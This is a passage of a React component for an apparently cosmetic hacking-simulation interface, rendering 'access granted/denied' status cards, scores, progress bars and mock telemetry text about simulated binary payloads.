            className={`w-full rounded-2xl p-4 sm:p-5 flex flex-col gap-3 border-2 shadow-[0_0_40px_rgba(0,0,0,0.8)] relative overflow-hidden backdrop-blur-2xl ${
              effectiveIsSecure
                ? 'bg-[#040817]/95 border-red-500/80 text-red-100 shadow-[0_0_35px_rgba(239,68,68,0.35)]'
                : 'bg-[#020b14]/95 border-emerald-400/80 text-emerald-100 shadow-[0_0_35px_rgba(16,185,129,0.35)]'
            }`}
          >
            <div className="flex items-center justify-between border-b pb-2 relative z-10 border-slate-800">
              <div className="flex items-center gap-2">
                <span className="flex h-2.5 w-2.5 relative">
                  <span className={`animate-ping absolute inline-flex h-full w-full rounded-full ${effectiveIsSecure ? 'bg-red-400' : 'bg-emerald-400'} opacity-75`}></span>
                  <span className={`relative inline-flex rounded-full h-2.5 w-2.5 ${effectiveIsSecure ? 'bg-red-500' : 'bg-emerald-500'}`}></span>
                </span>
                <span className={`text-[11px] font-black tracking-wider uppercase font-mono ${effectiveIsSecure ? 'text-red-400' : 'text-emerald-400'}`}>
                  {effectiveIsSecure ? 'SHIELD ACTIVE // ACCESS DENIED' : 'VULNERABILITY FOUND // ACCESS GRANTED'}
                </span>
              </div>

              <button
                onClick={() => {
                  setShowStatusDialog(false);
                  setDialogDismissed(true);
                }}
                className="text-slate-400 hover:text-white p-1 rounded-md hover:bg-slate-800/80 transition-colors cursor-pointer"
                title="Dismiss status card"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Dialog Content */}
            <div className="flex items-start gap-3 relative z-10 pt-0.5">
              <div
                className={`w-11 h-11 rounded-xl flex items-center justify-center border shrink-0 shadow-lg ${
                  effectiveIsSecure
                    ? 'bg-red-950/80 border-red-500/70 text-red-400 shadow-[0_0_15px_rgba(239,68,68,0.4)]'
                    : 'bg-emerald-950/80 border-emerald-400/70 text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.4)]'
                }`}
              >
                {effectiveIsSecure ? (
                  <ShieldAlert className="w-5 h-5 animate-pulse" />
                ) : (
                  <Unlock className="w-5 h-5 animate-bounce" />
                )}
              </div>

              <div className="flex-1 min-w-0">
                <div className="flex items-center justify-between">
                  <h2
                    className={`text-base font-black tracking-tight uppercase ${
                      effectiveIsSecure ? 'text-red-400' : 'text-emerald-400'
                    }`}
                  >
                    {effectiveIsSecure ? 'ACCESS DENIED' : 'ACCESS GRANTED'}
                  </h2>
                  <span
                    className={`text-[9px] font-mono font-bold px-2 py-0.5 rounded border ${
                      effectiveIsSecure
                        ? 'bg-red-950 text-red-300 border-red-500/50'
                        : 'bg-emerald-950 text-emerald-300 border-emerald-500/50'
                    }`}
                  >
                    {effectiveIsSecure ? 'SCORE: 96/100' : 'SCORE: 48/100'}
                  </span>
                </div>

                <p className="text-xs text-slate-300 leading-relaxed font-sans mt-1">
                  {effectiveIsSecure ? (
                    <>
                      <strong className="text-white">Hardened defense.</strong> Enterprise WAF & TLS 1.3 active;
                      simulated 0 & 1 offensive payloads dropped at perimeter edge.
                    </>
                  ) : (
                    <>
                      <strong className="text-white">Weak defense perimeter.</strong> Open cross-origin reflection and
                      missing CSP headers allowed simulated 0 & 1 payloads to breach server core.
                    </>
                  )}
                </p>
              </div>
            </div>

            {/* Automated Progress Footer */}
            <div
              className={`w-full py-1 px-2.5 rounded-lg border flex items-center justify-between text-[10px] font-mono font-bold relative z-10 ${
                effectiveIsSecure
                  ? 'bg-red-950/40 border-red-500/30 text-red-300'
                  : 'bg-emerald-950/40 border-emerald-500/30 text-emerald-300'
              }`}
            >
              <span className="flex items-center gap-1.5">
                <RefreshCw className="w-3 h-3 animate-spin text-current" />
                <span>AUTOPILOT INFILTRATION</span>
              </span>
              <span className="text-white">PHASE {stepIndex + 1}/{totalSteps}</span>
            </div>
          </div>
        </div>
      )}

      {/* 8. BOTTOM TACTICAL STATUS DOCK */}
      <footer className="relative z-10 w-full space-y-1.5 bg-[#030712]/90 p-3 sm:p-4 rounded-2xl border border-slate-800/90 backdrop-blur-xl shadow-2xl">
        <div className="flex justify-between items-center text-xs sm:text-sm">
          <div className="flex items-center gap-2">
            <RefreshCw className="w-3.5 h-3.5 text-emerald-400 animate-spin" />
            <span className="text-emerald-300 font-black">
              PHASE {stepIndex + 1} OF {totalSteps}:
            </span>
            <span className="text-white font-bold">{currentStepDescription}</span>
          </div>
          <span className="text-emerald-300 font-black text-sm drop-shadow-[0_0_6px_#10b981]">
            {progressPercent}%
          </span>
        </div>

        {/* Progress Bar */}
        <div className="w-full bg-slate-950 h-2.5 rounded-full overflow-hidden border border-slate-800 p-0.5">
          <div
            className={`h-full transition-all duration-300 rounded-full shadow-md ${
              effectiveIsSecure
                ? 'bg-gradient-to-r from-red-500 via-amber-400 to-white shadow-[0_0_10px_#ef4444]'
                : 'bg-gradient-to-r from-emerald-500 via-emerald-300 to-white shadow-[0_0_10px_#10b981]'
            }`}
            style={{ width: `${progressPercent}%` }}
          />
        </div>

        {/* Real-time status stream telemetry */}
        <div className="flex items-center justify-between text-xs pt-0.5 border-t border-slate-800/80">
          <div className="flex items-center gap-2 overflow-hidden">
            <Radio className="w-3.5 h-3.5 text-emerald-400 animate-pulse shrink-0" />
            <span className="text-slate-500 uppercase font-black shrink-0">DIAGNOSTIC:</span>
            <span className="text-slate-300 font-medium truncate">
              {effectiveIsSecure
                ? 'TARGET FIREWALL ACTIVE: 010101 INJECTION ATTEMPTS DEFLECTED'
                : 'TARGET PENETRATION SUCCEEDED: 010101 PAYLOAD ACCESSED ROOT BUFFER'}
            </span>
          </div>
          <span className="text-slate-500 text-[11px] shrink-0 hidden sm:inline font-mono">
            {elapsedSeconds}s ELAPSED // REALTIME TELEMETRY
          </span>
        </div>
      </footer>
    </div>
  );
}
